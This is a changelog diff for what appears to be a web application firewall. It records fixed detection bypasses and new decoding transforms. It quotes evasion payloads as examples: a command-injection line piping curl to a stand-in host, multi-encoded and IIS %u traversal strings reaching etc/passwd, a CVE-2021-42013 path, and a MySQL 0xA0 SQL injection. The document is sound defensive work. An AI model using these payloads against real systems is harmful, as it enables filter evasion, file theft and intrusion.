@@ -8,6 +8,65 @@ semver, and the four extension interfaces are frozen hard.
 
 ### Fixed
 
+- **Writing a command's full path bypassed shell-injection detection.** `; id`
+  was blocked and `; /usr/bin/id` was not: `commandWord` stops at the leading
+  slash, and `scanPaths` only resolved basenames against the interpreter list, so
+  `/bin/sh` and `/bin/bash` were caught and nothing else was. `| /usr/bin/curl
+  evil.test` reached the backend. An absolute path in command position now
+  resolves to its final component and is looked up in the full command
+  vocabulary — in command position specifically, so `/api/v1/ping` in an ordinary
+  value is untouched.
+
+- **`/static/js/node.min.js` was blocked.** `SignalInterpreterPath` is worth 5 and
+  reaches the threshold alone, and it fired on any `/interpreter` preceded by a
+  path component without checking what followed — so a bundled asset URL, which
+  is on a large share of the web, read as the node interpreter. A name followed
+  by `.` or `/` is a stem or a directory, not the executable.
+
+- **Triple-encoded input walked through.** `%252e%252e%252f` was blocked because
+  the one-pass reading composed with a rule's own `urlDecode` transform covers
+  two decoders; `%25252e%25252e%25252f` was not, and a CDN in front of a proxy in
+  front of an application is three. `ClassMultiEncoded` adds a fixed-point
+  reading, bounded at four passes, triggered only on `%2525`. It is a separate
+  reading rather than more passes on `ClassDoubleEncoded` because decoding
+  further can destroy the evidence — `%%32%65%%32%65%2fapp.conf`
+  (CVE-2021-42013) reads as traversal after one pass and normalises to an
+  ordinary `/app.conf` after three. The evasion corpus caught that regression.
+
+- **`%uXXXX` was not decoded at all.** IIS's own encoding is in no URI standard
+  and IIS and ASP.NET decode it anyway; `%u002e%u002e%u2215etc%u2215passwd`
+  reached the backend. `ClassPercentU` adds the reading, including the handful of
+  characters Windows best-fit maps to ASCII when narrowing UTF-16 — U+2215 and
+  U+FF0F are not slashes until they arrive at the handler.
+
+- **`1%a0OR%a01=1` was not detected.** MySQL's lexer accepts `0xA0` as
+  whitespace, so the injection runs while reading as one identifier to an
+  ASCII-only tokenizer. The tab, newline and carriage-return spellings of the
+  same payload were all blocked.
+
+### Added
+
+- **Five transforms: `CSSDecode`, `CmdLine`, `ReplaceComments`,
+  `RemoveCommentsChar`, `Base64Decode`**, and `transform.All`. The cost of not
+  having them was measured rather than guessed: the pentest harness ran a
+  converted Core Rule Set and scored **zero on every XSS category**, because CRS
+  941100 *is* the `@detectXSS` rule and carries `t:cssDecode`, so the converter
+  skipped it — while `@detectSQLi` carries no such transform, converted, and
+  scored 3/3. One missing normalization cost an entire detection tier. `seclang`
+  maps all five, and each has a fuzz target: `transform.All` is what the fuzz
+  corpus and the `MaxOutputLen` test iterate, so a new transform cannot be added
+  without them. Both lists were hand-written and had already fallen behind —
+  `EscapeDecode` shipped without ever being fuzzed.
+
+- **Protocol and robustness phases in `test/pentest/run.sh`**: `canon`
+  (multi-interpretation decoding), `hpp` (parameter pollution), `headers`,
+  `multipart` (hand-written bodies — the framing is the attack), `limits` (deep,
+  wide and long inputs, where the pass condition is "answered, quickly" rather
+  than "blocked") and `concurrent` (interleaved attack and benign traffic,
+  checking for cross-transaction state leakage). Every fix above came from them.
+
+### Fixed
+
 - **A converted Core Rule Set answered 403 to every request.** `generate.go`
   rendered every regex operator as `seclang.MustRegex(pattern)`, discarding
   `Negated()`. SecLang's `!@rx` therefore came back as its own opposite, and CRS
